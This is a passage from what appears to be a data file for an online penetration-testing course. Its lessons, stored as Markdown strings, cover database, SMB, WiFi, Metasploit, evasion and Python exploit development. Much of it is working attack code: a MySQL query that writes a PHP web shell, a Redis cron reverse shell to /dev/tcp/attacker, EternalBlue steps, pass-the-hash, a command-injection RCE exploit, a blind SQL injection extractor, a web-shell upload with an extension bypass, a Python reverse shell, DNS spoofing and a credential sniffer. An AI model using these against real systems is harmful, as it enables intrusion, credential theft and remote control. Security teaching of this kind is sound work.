**Read Files (if FILE privilege):**
\`\`\`sql
SELECT LOAD_FILE('/etc/passwd');
\`\`\`

**Write Files:**
\`\`\`sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
\`\`\`

## PostgreSQL (Port 5432)

**Connect:**
\`\`\`bash
psql -h 192.168.1.1 -U postgres
\`\`\`

**Common Default:** postgres : postgres

**Enumeration:**
\`\`\`sql
\l        -- List databases
\c db     -- Connect to database
\dt       -- List tables
SELECT * FROM users;
\`\`\`

## MongoDB (Port 27017)

**Connect:**
\`\`\`bash
mongo mongodb://192.168.1.1:27017
\`\`\`

**No Auth Check:**
\`\`\`javascript
show dbs
use admin
db.users.find()
\`\`\`

**Common Issue:** Many MongoDB instances have NO authentication!

## Redis (Port 6379)

**Connect:**
\`\`\`bash
redis-cli -h 192.168.1.1
\`\`\`

**Test No Auth:**
\`\`\`
INFO
KEYS *
GET key_name
\`\`\`

**RCE via Cron:**
\`\`\`bash
config set dir /var/spool/cron/
config set dbfilename root
set evil "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n"
save
\`\`\`

## Protection Tips

✅ Bind to localhost only
✅ Use strong passwords
✅ Enable authentication
✅ Use firewall rules
✅ Keep software updated
✅ Disable FILE privilege (MySQL)
                        `
                    },
                    {
                        id: 'smb-attacks',
                        title: 'SMB & Windows Network Services',
                        type: 'text',
                        duration: '25m',
                        xp: 100,
                        content: `
# SMB Exploitation

SMB (Server Message Block) is used for file sharing on Windows networks (Port 445).

## SMB Enumeration

**Using Nmap:**
\`\`\`bash
nmap -p 445 --script smb-enum-shares 192.168.1.1
nmap -p 445 --script smb-enum-users 192.168.1.1
nmap -p 445 --script smb-os-discovery 192.168.1.1
\`\`\`

**Using SMBClient:**
\`\`\`bash
smbclient -L //192.168.1.1 -N  # List shares (null session)
smbclient //192.168.1.1/share -U username
\`\`\`

**Using Enum4linux:**
\`\`\`bash
enum4linux -a 192.168.1.1
\`\`\`

## EternalBlue (MS17-010)

Famous exploit used by WannaCry ransomware.

**Check if Vulnerable:**
\`\`\`bash
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.1
\`\`\`

**Exploit with Metasploit:**
\`\`\`
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST your_ip
exploit
\`\`\`

## SMB Brute Force

**Using Hydra:**
\`\`\`bash
hydra -l administrator -P passwords.txt smb://192.168.1.1
\`\`\`

**Using Metasploit:**
\`\`\`
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.1
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
\`\`\`

## Pass-the-Hash

Use NTLM hash directly without cracking:

\`\`\`bash
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:hash //192.168.1.1 cmd
\`\`\`

> [!WARNING]
> EternalBlue is extremely destructive and can crash systems. Only use in authorized lab environments.
                        `
                    }
                ]
            },
            {
                id: 'net-m3',
                title: 'Wireless Security',
                duration: '45m',
                lessons: [
                    {
                        id: 'wifi-attacks',
                        title: 'WiFi Hacking Basics',
                        type: 'text',
                        duration: '25m',
                        xp: 100,
                        content: `
# WiFi Security 101

## Concepts
- **WPA2**: The standard (still hackable).
- **Handshake**: The 4-way data exchange we capture to crack passwords.
- **Monitor Mode**: Listening to ALL traffic, not just your own.

## The Attack Lifecycle
1. **Monitor**: Put card in monitor mode.
2. **Deauth**: Kick a user off to force a reconnect.
3. **Capture**: Record the 4-way handshake when they reconnect.
4. **Crack**: Brute-force the handshake offline.

## Tools of the Trade
- **Aircrack-ng**: The suite (airmon, airodump, aireplay).
- **Wifite**: Automated script (Best for beginners).
- **Kismet**: Passive detector.
                        `
                    },
                    {
                        id: 'aircrack-guide',
                        title: 'Aircrack-ng Guide',
                        type: 'text',
                        duration: '20m',
                        xp: 125,
                        content: `
# Aircrack-ng Commands

## 1. Start Monitor Mode
\`\`\`bash
sudo airmon-ng start wlan0
\`\`\`

## 2. Scan for Networks
\`\`\`bash
sudo airodump-ng wlan0mon
\`\`\`
*Look for the BSSID (Mac Address) and Channel.*

## 3. Capture Handshake
\`\`\`bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
\`\`\`

## 4. Deauth Attack (Kick User)
\`\`\`bash
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
\`\`\`

## 5. Crack Password
\`\`\`bash
sudo aircrack-ng -w wordlist.txt capture-01.cap
\`\`\`
                        `
                    }
                ]
            },
            {
                id: 'net-m4',
                title: 'Metasploit Framework',
                duration: '60m',
                lessons: [
                    {
                        id: 'msf-basics',
                        title: 'Metasploit Console',
                        type: 'text',
                        duration: '30m',
                        xp: 100,
                        content: `
# Metasploit (MSF)

The most popular exploitation framework.

## Key Interface
Start with:
\`\`\`bash
msfconsole
\`\`\`

## Core Commands
- **search [term]**: Find exploits (e.g., \`search eternalblue\`).
- **use [id]**: Select an exploit (e.g., \`use 0\`).
- **show options**: See what you need to configure.
- **set [OPTION] [VALUE]**: Configure (e.g., \`set RHOSTS 10.10.10.5\`).
- **check**: Test vulnerability without exploiting.
- **exploit** (or **run**): Launch the attack.
                        `
                    },
                    {
                        id: 'meterpreter-intro',
                        title: 'Meterpreter Basics',
                        type: 'text',
                        duration: '30m',
                        xp: 120,
                        content: `
# Meterpreter

The advanced payload that runs *after* exploitation.

## Essential Commands
- **sysinfo**: System details.
- **getuid**: Current user identity.
- **screenshot**: Capture desktop.
- **hashdump**: Dump Windows password hashes.
- **shell**: Drop into a standard system shell.
- **upload/download**: Transfer files.
- **background**: Hide session (CTRL+Z).

## Pro Tip
Use \`sessions -l\` to list active hacks and \`sessions -i 1\` to jump back in.
                        `
                    }
                ]
            },
            {
                id: 'net-m5',
                title: 'Post-Exploitation',
                duration: '45m',
                lessons: [
                    {
                        id: 'privesc-concepts',
                        title: 'Privilege Escalation',
                        type: 'text',
                        duration: '25m',
                        xp: 100,
                        content: `
# Getting to Root/Admin

You hacked a low-level user. Now you need full control.

## Linux Strategy
1. **Kernel Exploits**: Old kernel versions (Dirty Cow).
2. **Sudo Rights**: \`sudo -l\` (What can I run as root?).
3. **SUID Binaries**: Programs that run as root.
4. **Weak Permissions**: Editable \`/etc/passwd\`.

## Windows Strategy
1. **Unpatched Services**: Check \`systeminfo\`.
2. **Weak Service Permissions**: Can I restart a service with my malware?
3. **AlwaysInstallElevated**: Registry setting allowing .msi as admin.
                        `
                    },
                    {
                        id: 'persistence',
                        title: 'Establishing Persistence',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# Staying In

How to keep access after a reboot.

## Linux Persistence
- **Cron Jobs**: Add a reverse shell to run every hour.
- **SSH Keys**: Add your key to \`~/.ssh/authorized_keys\`.
- **Bashrc**: Add command to user's login script.

## Windows Persistence
- **Registry Run Keys**: \`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\`.
- **Scheduled Tasks**: \`schtasks /create ...\`
- **Services**: Create a malicious service that auto-starts.
                        `
                    }
                ]
            },
            {
                id: 'net-m6',
                title: 'Firewalls & Evasion',
                duration: '40m',
                lessons: [
                    {
                        id: 'ids-evasion',
                        title: 'Evading IDS/IPS',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# Evasion Basics

## Nmap Evasion
- **Slow Down**: \`-T0\` or \`-T1\` (paranoid timing).
- **Fragment Packets**: \`-f\` (splits packets to confuse firewalls).
- **Decoys**: \`-D RND:10\` (Spoof scans from 10 other IPs + yours).

## Payload Obfuscation
- **Encoding**: Use \`msfvenom -e x86/shikata_ga_nai\`.
- **Encryption**: Encrypt shellcode and decrypt in memory.
- **Living off the Land**: Use built-in tools (PowerShell, CertUtil) instead of downloading malware.
                        `
                    },
                    {
                        id: 'firewall-types',
                        title: 'Firewall Types',
                        type: 'text',
                        duration: '20m',
                        xp: 75,
                        content: `
# Know Your Enemy

## 1. Packet Filtering
Simple rule-based. "Block Port 80".
*Bypass*: Use allowed ports (53 DNS, 443 HTTPS).

## 2. Stateful Inspection
Tracks connection state (SYN, SYN-ACK).
*Bypass*: Piggyback on established connections.

## 3. Web Application Firewall (WAF)
inspects HTTP traffic (SQLi, XSS patterns).
*Bypass*: Encoding (\`%27\`), Double URL encoding.
                        `
                    }
                ]
            },
            {
                id: 'net-m7',
                title: 'Mobile Network Attacks',
                duration: '35m',
                lessons: [
                    {
                        id: 'mitm-attacks',
                        title: 'Man-in-the-Middle (MITM)',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# MITM Attacks

Intercepting traffic between a victim and the router.

## ARP Spoofing
You tell the victim "I am the Router".
You tell the router "I am the Victim".
Traffic flows through YOU.

## Tools
- **Bettercap**: The modern swiss-army knife.
- **Ettercap**: Old school but effective.
- **Wireshark**: To read the intercepted data.

## Defense
- **VPN**: Encrypts traffic even inside the tunnel.
- **HTTPS**: Encrypts the payload (hacker sees garbage).
                        `
                    },
                    {
                        id: 'arp-spoofing-lab',
                        title: 'ARP Spoofing Theory',
                        type: 'text',
                        duration: '15m',
                        xp: 75,
                        content: `
# Protocol Weakness

ARP (Address Resolution Protocol) has no authentication. It trusts whatever it hears.

## The Logic
1. Target IP: 192.168.1.5
2. Router IP: 192.168.1.1
3. Attacker sends ARP Reply: "192.168.1.1 is at [ATTACKER_MAC]"
4. Victim updates ARP table.
5. All internet traffic goes to Attacker.

> [!CAUTION]
> Extremely noisy. Easy to detect by IDS.
                        `
                    }
                ]
            }
        ]
    },
    {
        id: 'python-for-pentesters',
        title: 'Python for Pentesters',
        description: 'Automate your attacks and build custom tools using Python.',
        icon: Terminal,
        level: 'Advanced',
        duration: '7h 30m',
        xp: 2500,
        modules: [
            {
                id: 'py-m1',
                title: 'Python Basics for Hacking',
                duration: '90m',
                lessons: [
                    {
                        id: 'python-setup',
                        title: 'Python Environment Setup',
                        type: 'text',
                        duration: '20m',
                        xp: 75,
                        content: `
# Python for Penetration Testing

## Why Python?

- Easy to learn and read
- Massive library ecosystem
- Cross-platform (Windows, Linux, macOS)
- Industry standard for security tools
- Used by: Metasploit, Burp extensions, custom exploits

## Installation

**Linux/macOS:**
\`\`\`bash
# Usually pre-installed
python3 --version

# Install pip (package manager)
sudo apt install python3-pip  # Linux
brew install python3          # macOS
\`\`\`

**Windows:**
Download from python.org and check "Add to PATH"

## Essential Libraries

\`\`\`bash
pip install requests        # HTTP requests
pip install beautifulsoup4  # HTML parsing
pip install paramiko        # SSH
pip install scapy           # Packet manipulation
pip install pwntools        # Exploit development
pip install python-nmap     # Nmap integration
\`\`\`

## Basic Syntax

\`\`\`python
# Variables
name = "Hacker"
age = 25
is_admin = True

# Lists
ports = [80, 443, 8080]

# Dictionaries
user = {"username": "admin", "password": "secret"}

# Loops
for port in ports:
    print(f"Scanning port {port}")

# Functions
def scan_port(ip, port):
    # code here
    pass

# Conditional
if age >= 18:
    print("Access granted")
else:
    print("Access denied")
\`\`\`
                        `
                    },
                    {
                        id: 'python-requests',
                        title: 'Automating HTTP with Requests',
                        type: 'text',
                        duration: '40m',
                        xp: 150,
                        content: `
# Python Requests Library

The \`requests\` library makes HTTP requests easy.

## Installation

\`\`\`bash
pip install requests
\`\`\`

## Basic Requests

**GET Request:**
\`\`\`python
import requests

response = requests.get('https://example.com')
print(response.status_code)  # 200
print(response.text)          # HTML content
\`\`\`

**POST Request:**
\`\`\`python
data = {'username': 'admin', 'password': 'test'}
response = requests.post('https://example.com/login', data=data)
\`\`\`

**With Headers:**
\`\`\`python
headers = {
    'User-Agent': 'Mozilla/5.0',
    'Authorization': 'Bearer token123'
}
response = requests.get('https://api.example.com', headers=headers)
\`\`\`

**With Cookies:**
\`\`\`python
cookies = {'session_id': 'abc123'}
response = requests.get('https://example.com', cookies=cookies)
\`\`\`

## Practical Examples

### Example 1: Login Bruteforcer

\`\`\`python
import requests

target = "https://example.com/login"
usernames = ["admin", "root", "user"]
passwords = open("passwords.txt").read().splitlines()

for username in usernames:
    for password in passwords:
        data = {"username": username, "password": password}
        response = requests.post(target, data=data)

        if "Invalid credentials" not in response.text:
            print(f"[+] Found: {username}:{password}")
            break
\`\`\`

### Example 2: SQL Injection Tester

\`\`\`python
import requests

url = "https://example.com/product?id="
payloads = ["1' OR '1'='1", "1' UNION SELECT NULL--", "1'; DROP TABLE users--"]

for payload in payloads:
    response = requests.get(url + payload)

    if "mysql" in response.text.lower() or "syntax error" in response.text.lower():
        print(f"[!] Vulnerable to: {payload}")
\`\`\`

### Example 3: Directory Bruteforcer

\`\`\`python
import requests

base_url = "https://example.com/"
wordlist = open("directories.txt").read().splitlines()

for directory in wordlist:
    url = base_url + directory
    response = requests.get(url)

    if response.status_code == 200:
        print(f"[+] Found: {url}")
    elif response.status_code == 403:
        print(f"[!] Forbidden: {url}")
\`\`\`

## Session Management

\`\`\`python
# Maintain cookies across requests
session = requests.Session()

# Login
session.post('https://example.com/login', data={'user': 'admin', 'pass': 'secret'})

# Make authenticated requests
response = session.get('https://example.com/dashboard')
\`\`\`

## Handling Timeouts & Errors

\`\`\`python
try:
    response = requests.get('https://example.com', timeout=5)
    response.raise_for_status()  # Raise error for 4xx/5xx
except requests.Timeout:
    print("Request timed out")
except requests.RequestException as e:
    print(f"Error: {e}")
\`\`\`

## Proxying Through Burp

\`\`\`python
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

# Disable SSL verification for Burp
response = requests.get('https://example.com', proxies=proxies, verify=False)
\`\`\`
                        `
                    },
                    {
                        id: 'writing-exploits',
                        title: 'Writing Custom Exploits',
                        type: 'text',
                        duration: '30m',
                        xp: 125,
                        content: `
# Writing Custom Exploits

## Exploit Structure

\`\`\`python
#!/usr/bin/env python3

import requests
import sys

# Configuration
TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://target.com"
VULN_ENDPOINT = "/api/vulnerable"

def exploit():
    """Main exploit function"""
    print(f"[*] Targeting: {TARGET}")

    # Step 1: Check if vulnerable
    if not check_vulnerable():
        print("[-] Target not vulnerable")
        return

    # Step 2: Exploit
    print("[+] Exploiting...")
    payload = craft_payload()
    response = send_payload(payload)

    # Step 3: Verify success
    if verify_exploit(response):
        print("[+] Exploit successful!")
    else:
        print("[-] Exploit failed")

def check_vulnerable():
    """Check if target is vulnerable"""
    response = requests.get(f"{TARGET}{VULN_ENDPOINT}")
    return "vulnerable_signature" in response.text

def craft_payload():
    """Create exploit payload"""
    return {"cmd": "whoami"}

def send_payload(payload):
    """Send the exploit"""
    return requests.post(f"{TARGET}{VULN_ENDPOINT}", json=payload)

def verify_exploit(response):
    """Verify exploit worked"""
    return response.status_code == 200

if __name__ == "__main__":
    exploit()
\`\`\`

## Real Example: RCE Exploit

\`\`\`python
#!/usr/bin/env python3
import requests
import base64

TARGET = "http://vulnerable-app.com"

def exploit_rce(command):
    """
    Exploits command injection in /api/ping endpoint
    Vulnerable code: os.system(f"ping -c 1 {user_input}")
    """

    # Payload: 127.0.0.1; [our_command]
    payload = f"127.0.0.1; {command}"

    response = requests.post(
        f"{TARGET}/api/ping",
        json={"host": payload}
    )

    # Extract output
    if response.status_code == 200:
        output = response.json().get("output", "")
        print(f"[+] Command output:\\n{output}")
        return True
    return False

# Usage
exploit_rce("id")
exploit_rce("cat /etc/passwd")
\`\`\`

## SQL Injection Exploiter

\`\`\`python
import requests
import string

TARGET = "http://vuln-site.com/product?id="

def extract_database_name():
    """Extract database name using blind SQLi"""
    database = ""

    for position in range(1, 50):
        for char in string.ascii_lowercase + string.digits:
            # Payload: 1' AND SUBSTRING(database(),{position},1)='{char}'--
            payload = f"1' AND SUBSTRING(database(),{position},1)='{char}'-- "

            response = requests.get(TARGET + payload)

            if "Product found" in response.text:
                database += char
                print(f"[+] Database: {database}")
                break
        else:
            # No more characters
            break

    return database

db_name = extract_database_name()
print(f"[+] Full database name: {db_name}")
\`\`\`

## File Upload Exploit

\`\`\`python
import requests

TARGET = "http://target.com/upload"

# Create PHP webshell
shell_content = '<?php system($_GET["cmd"]); ?>'

# Bypass extension filter (double extension)
files = {
    'file': ('shell.php.jpg', shell_content, 'image/jpeg')
}

response = requests.post(TARGET, files=files)

if response.status_code == 200:
    shell_url = response.json().get('url')
    print(f"[+] Shell uploaded: {shell_url}?cmd=whoami")
\`\`\`
                        `
                    }
                ]
            },
            {
                id: 'py-m2',
                title: 'Network Automation',
                duration: '120m',
                lessons: [
                    {
                        id: 'socket-programming',
                        title: 'Socket Programming',
                        type: 'text',
                        duration: '40m',
                        xp: 150,
                        content: `
# Socket Programming in Python

Sockets enable network communication. Essential for building custom network tools.

## Basic TCP Client

\`\`\`python
import socket

# Create socket
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to server
client.connect(('example.com', 80))

# Send data
client.send(b"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n")

# Receive data
response = client.recv(4096)
print(response.decode())

# Close connection
client.close()
\`\`\`

## Basic TCP Server

\`\`\`python
import socket

# Create socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 9999))
server.listen(5)

print("[*] Listening on port 9999...")

while True:
    client, addr = server.accept()
    print(f"[+] Connection from {addr}")

    client.send(b"Welcome!\\n")
    data = client.recv(1024)

    print(f"[*] Received: {data}")
    client.close()
\`\`\`

## Port Scanner

\`\`\`python
import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(ip, port):
    """Scan single port"""
    try:
        sock = socket.socket()
        sock.settimeout(1)
        sock.connect((ip, port))
        sock.close()
        return port
    except:
        return None

def scan_host(ip, ports):
    """Scan multiple ports"""
    open_ports = []

    with ThreadPoolExecutor(max_workers=100) as executor:
        results = executor.map(lambda p: scan_port(ip, p), ports)

        for port in results:
            if port:
                open_ports.append(port)
                print(f"[+] Port {port} is open")

    return open_ports

# Scan common ports
target = "192.168.1.1"
ports = [21, 22, 23, 25, 80, 443, 3306, 8080]
scan_host(target, ports)
\`\`\`

## Banner Grabber

\`\`\`python
import socket

def grab_banner(ip, port):
    """Grab service banner"""
    try:
        sock = socket.socket()
        sock.settimeout(2)
        sock.connect((ip, port))

        # Try to receive banner
        banner = sock.recv(1024).decode().strip()
        sock.close()

        return banner
    except Exception as e:
        return f"Error: {e}"

# Usage
banner = grab_banner('192.168.1.1', 22)
print(f"Banner: {banner}")
\`\`\`

## Reverse Shell

\`\`\`python
import socket
import subprocess
import os

# Attacker's IP and port
ATTACKER_IP = "10.10.10.1"
ATTACKER_PORT = 4444

# Connect to attacker
sock = socket.socket()
sock.connect((ATTACKER_IP, ATTACKER_PORT))

while True:
    # Receive command
    command = sock.recv(1024).decode()

    if command.lower() == 'exit':
        break

    # Execute command
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        sock.send(output)
    except Exception as e:
        sock.send(f"Error: {e}\\n".encode())

sock.close()
\`\`\`

**Listener (Attacker):**
\`\`\`bash
nc -lvnp 4444
\`\`\`
                        `
                    },
                    {
                        id: 'scapy-packet-manipulation',
                        title: 'Packet Crafting with Scapy',
                        type: 'text',
                        duration: '45m',
                        xp: 175,
                        content: `
# Scapy: Packet Manipulation

Scapy is a powerful Python library for crafting and sending custom network packets.

## Installation

\`\`\`bash
pip install scapy
\`\`\`

## Basic Usage

\`\`\`python
from scapy.all import *

# Create IP packet
ip = IP(dst="192.168.1.1")

# Create TCP packet
tcp = TCP(dport=80)

# Combine layers
packet = ip/tcp

# Send packet
send(packet)
\`\`\`

## ARP Scanner

\`\`\`python
from scapy.all import *

def arp_scan(network):
    """Scan network using ARP"""
    # Create ARP request
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Send and receive
    result = srp(packet, timeout=3, verbose=0)[0]

    devices = []
    for sent, received in result:
        devices.append({
            'ip': received.psrc,
            'mac': received.hwsrc
        })

    return devices

# Scan local network
devices = arp_scan("192.168.1.0/24")
for device in devices:
    print(f"IP: {device['ip']}, MAC: {device['mac']}")
\`\`\`

## Custom SYN Scanner

\`\`\`python
from scapy.all import *

def syn_scan(target, ports):
    """SYN scan (stealth scan)"""
    open_ports = []

    for port in ports:
        # Craft SYN packet
        pkt = IP(dst=target)/TCP(dport=port, flags='S')

        # Send and wait for response
        resp = sr1(pkt, timeout=1, verbose=0)

        if resp and resp.haslayer(TCP):
            if resp[TCP].flags == 0x12:  # SYN-ACK
                open_ports.append(port)
                # Send RST to close connection
                rst = IP(dst=target)/TCP(dport=port, flags='R')
                send(rst, verbose=0)

    return open_ports

# Usage
target = "192.168.1.1"
ports = [21, 22, 80, 443, 3306]
open_ports = syn_scan(target, ports)
print(f"Open ports: {open_ports}")
\`\`\`

## DNS Spoofing

\`\`\`python
from scapy.all import *

def dns_spoof(pkt):
    """Intercept and modify DNS responses"""
    if pkt.haslayer(DNSQR):
        # Create fake response
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\\
                      UDP(dport=pkt[UDP].sport, sport=53)/\\
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata="ATTACKER_IP"))

        send(spoofed_pkt, verbose=0)
        print(f"[*] Spoofed DNS: {pkt[DNS].qd.qname} -> ATTACKER_IP")

# Sniff DNS queries
sniff(filter="udp port 53", prn=dns_spoof)
\`\`\`

## Packet Sniffer

\`\`\`python
from scapy.all import *

def packet_callback(packet):
    """Process captured packets"""
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        # Check for credentials
        payload = str(packet[Raw].load)
        keywords = ['user', 'pass', 'login', 'auth']

        for keyword in keywords:
            if keyword in payload.lower():
                print(f"[!] Interesting: {packet[IP].src} -> {packet[IP].dst}")
                print(f"    Payload: {payload[:100]}")

# Sniff HTTP traffic
sniff(filter="tcp port 80", prn=packet_callback, store=0)
\`\`\`
                        `
                    },
                    {
                        id: 'automation-tools',
                        title: 'Building Security Tools',
                        type: 'text',
                        duration: '35m',
                        xp: 125,
                        content: `
# Building Custom Security Tools

## Multi-threaded Subdomain Bruteforcer

\`\`\`python
#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor
import sys

def check_subdomain(subdomain, domain):
    """Check if subdomain exists"""
    url = f"http://{subdomain}.{domain}"
    try:
        response = requests.get(url, timeout=2)
        return (subdomain, response.status_code)
    except:
        return None

def bruteforce_subdomains(domain, wordlist_file):
    """Bruteforce subdomains"""
    print(f"[*] Starting subdomain enumeration for {domain}")

    # Load wordlist
    with open(wordlist_file) as f:
        subdomains = f.read().splitlines()

    found = []

    # Multi-threaded scanning
    with ThreadPoolExecutor(max_workers=50) as executor:
        results = executor.map(lambda s: check_subdomain(s, domain), subdomains)

        for result in results:
            if result:
                subdomain, status = result
                found.append(subdomain)
                print(f"[+] Found: {subdomain}.{domain} (Status: {status})")

    print(f"\\n[*] Found {len(found)} subdomains")
    return found

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <domain> <wordlist>")
        sys.exit(1)

    domain = sys.argv[1]
    wordlist = sys.argv[2]

    bruteforce_subdomains(domain, wordlist)
\`\`\`

## API Fuzzer

\`\`\`python
import requests
import json

class APIFuzzer:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def fuzz_endpoint(self, endpoint, params={}):
        """Fuzz API endpoint with payloads"""
        payloads = [
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "${7 * 7}",
            "{{7*7}}",
            "-1 OR 1=1",
            "admin'--"
        ]

        for payload in payloads:
            # Fuzz each parameter
            for key in params:
                test_params = params.copy()
                test_params[key] = payload

                response = self.session.get(
                    f"{self.base_url}{endpoint}",
                    params=test_params
                )

                # Check for vulnerabilities
                self.analyze_response(response, key, payload)

    def analyze_response(self, response, param, payload):
        """Analyze response for vulnerabilities"""
        indicators = {
            'sql': ['mysql', 'sql syntax', 'sqlstate'],
            'xss': [payload],
            'lfi': ['root:x:0:0:', '/etc/passwd'],
            'rce': ['uid=', 'gid='],
            'ssti': ['49', '343']  # Results of 7*7, 7*7*7
        }

        for vuln_type, keywords in indicators.items():
            for keyword in keywords:
                if keyword.lower() in response.text.lower():
                    print(f"[!] Possible {vuln_type.upper()}: {param}={payload}")

# Usage
fuzzer = APIFuzzer("https://api.example.com")
fuzzer.fuzz_endpoint("/user/profile", {"id": "1"})
\`\`\`

## Automated SQLi Detector

\`\`\`python
import requests
import time

class SQLiDetector:
    def __init__(self, url):
        self.url = url
        self.vulnerable = False

    def test_error_based(self):
        """Test for error-based SQLi"""
        payloads = ["'", '"', "1'", "1'--", "1' OR '1'='1"]
        sql_errors = [
            "mysql", "sql syntax", "sqlstate",
            "ora-", "postgresql", "sqlite"
        ]

        for payload in payloads:
            response = requests.get(f"{self.url}{payload}")

            for error in sql_errors:
                if error in response.text.lower():
                    print(f"[+] Error-based SQLi: {payload}")
                    return True
        return False

    def test_boolean_based(self):
        """Test for boolean-based blind SQLi"""
        # True condition
        true_payload = "1' AND '1'='1"
        true_response = requests.get(f"{self.url}{true_payload}")

        # False condition
        false_payload = "1' AND '1'='2"
        false_response = requests.get(f"{self.url}{false_payload}")

        # Compare responses
        if len(true_response.text) != len(false_response.text):
            print("[+] Boolean-based blind SQLi detected")
            return True
        return False

    def test_time_based(self):
        """Test for time-based blind SQLi"""
        payload = "1' AND SLEEP(5)--"

        start = time.time()
        requests.get(f"{self.url}{payload}")
        elapsed = time.time() - start

        if elapsed >= 5:
            print("[+] Time-based blind SQLi detected")
            return True
        return False

    def run_all_tests(self):
        """Run all SQLi detection tests"""
        print(f"[*] Testing {self.url}")

        if self.test_error_based():
            return "Error-based SQLi"
        elif self.test_boolean_based():
            return "Boolean-based blind SQLi"
        elif self.test_time_based():
            return "Time-based blind SQLi"
        else:
            return "Not vulnerable"

# Usage
detector = SQLiDetector("https://example.com/product?id=")
result = detector.run_all_tests()
print(f"\\n[*] Result: {result}")
\`\`\`
                        `
                    }
                ]
            },
            {
                id: 'py-m3',
                title: 'Web Scraping for Recon',
                duration: '45m',
                lessons: [
                    {
                        id: 'bs4-basics',
                        title: 'BeautifulSoup Basics',
                        type: 'text',
                        duration: '25m',
                        xp: 100,
                        content: `
# Web Scraping

Extracting data from websites automatically.

## Installation
\`\`\`bash
pip install beautifulsoup4 requests
\`\`\`

## The Logic
1. Fetch page with \`requests\`.
2. Parse HTML with \`BeautifulSoup\`.
3. Find elements (links, forms, comments).

## Example: Finding All Links
\`\`\`python
import requests
from bs4 import BeautifulSoup

url = "http://target.com"
r = requests.get(url)
soup = BeautifulSoup(r.text, 'html.parser')

# Find all <a> tags
for link in soup.find_all('a'):
    print(link.get('href'))
\`\`\`
                        `
                    },
                    {
                        id: 'scraping-comments',
                        title: 'Scraping Secrets',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# Hunting for Secrets

Developers often leave sensitive info in HTML comments.

## Python Extractor
\`\`\`python
from bs4 import Comment

comments = soup.find_all(string=lambda text: isinstance(text, Comment))

for c in comments:
    if "password" in c or "todo" in c.lower():
        print(f"[!] Found interesting comment: {c}")
\`\`\`

## What to Look For
- API Keys
- Internal IP addresses
- "TODO: Remove this"
- Developer names
                        `
                    }
                ]
            },
            {
                id: 'py-m4',
                title: 'Building Brute Forcers',
                duration: '60m',
                lessons: [
                    {
                        id: 'threading-basics',
                        title: 'Multi-Threading',
                        type: 'text',
                        duration: '30m',
                        xp: 125,
                        content: `
# Why Threading?

Network guessing is slow. Doing it one by one takes forever.
**Threading** lets us try 10, 50, or 100 passwords at once.

## Simple Threading Pattern
\`\`\`python
import threading

def attack(password):
    # Try login here
    print(f"Testing {password}")

passwords = ["123", "admin", "password"]
threads = []

for p in passwords:
    t = threading.Thread(target=attack, args=(p,))
    t.start()
    threads.append(t)

# Wait for all to finish
for t in threads:
    t.join()
\`\`\`
                        `
                    },
                    {
                        id: 'queue-management',
                        title: 'Queue Management',
                        type: 'text',
                        duration: '30m',
                        xp: 125,
                        content: `
# Worker Pattern

Creating 10,000 threads will crash your PC. Use a **Queue** and a fixed number of workers.

\`\`\`python
import threading
from queue import Queue

def worker():
    while True:
        password = q.get()
        attack(password)
        q.task_done()

# Setup Queue
q = Queue()
for p in open("wordlist.txt"):
    q.put(p.strip())

# Start 10 Threads
for _ in range(10):
    t = threading.Thread(target=worker)
    t.daemon = True
    t.start()
\`\`\`
                        `
                    }
                ]
            },
            {
                id: 'py-m5',
                title: 'Exploit Development',
                duration: '45m',
                lessons: [
                    {
                        id: 'payload-crafting',
                        title: 'Payload Crafting',
                        type: 'text',
                        duration: '20m',
                        xp: 100,
                        content: `
# Generating Malicious Inputs

Sometimes you need to generate bad data to break things.

## Buffer Overflow String
\`\`\`python
# Create a pattern of 500 'A's
payload = "A" * 500
\`\`\`

## Format String
\`\`\`python
# %x reads memory stack
payload = "%x %x %x %x"
\`\`\`

## NOP Sled
\`\`\`python
# \\x90 does nothing (No Operation)
# Used to slide into shellcode
nops = "\\x90" * 100
\`\`\`
                        `
                    },
                    {
                        id: 'fuzzing-intro',
                        title: 'Fuzzing Fundamentals',
                        type: 'text',
                        duration: '25m',
                        xp: 100,
                        content: `
# What is Fuzzing?

Throwing garbage data at a program to see if it crashes.

## Simple Fuzzer Logic
1. Connect to service.
2. Send "A".
3. Send "AA".
4. Send "AAA"...
5. If server stops responding, you found a buffer overflow.

## Python Loop
\`\`\`python
buffer = ["A"]
counter = 100

while len(buffer) <= 30:
    buffer.append("A" * counter)
    counter += 100
    
for string in buffer:
